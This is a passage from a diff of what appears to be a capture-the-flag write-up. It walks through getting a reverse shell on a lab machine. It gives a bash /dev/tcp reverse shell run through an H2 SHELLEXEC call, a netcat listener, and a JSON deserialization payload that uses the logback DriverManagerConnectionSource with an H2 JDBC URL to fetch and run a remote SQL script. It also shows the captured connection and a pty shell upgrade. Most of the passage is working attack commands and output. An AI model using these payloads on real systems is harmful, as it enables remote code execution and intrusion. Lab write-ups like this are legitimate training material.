@@ -32,7 +32,32 @@ $$;
 CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
 ```
 
+Now, start a netcat listener :
 
+```sh
+nc -nvlp 1337
+listening on [any] 1337 ...
+```
+
+Now inject the payload to : "Validate!(Beta)".
+
+```sh
+[“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/inject.sql'”}]
+```
+
+and you got a reverseshell
+
+```sh
+listening on [any] 1337 ...
+connect to [10.10.14.64] from (UNKNOWN) [10.10.10.214] 42212
+```
+
+Now for a good stable shell, type :
+
+```sh
+$python -c “import pty;pty.spawn(‘/bin/bash’)”
+$export TERM=xterm
+```
 
 
 
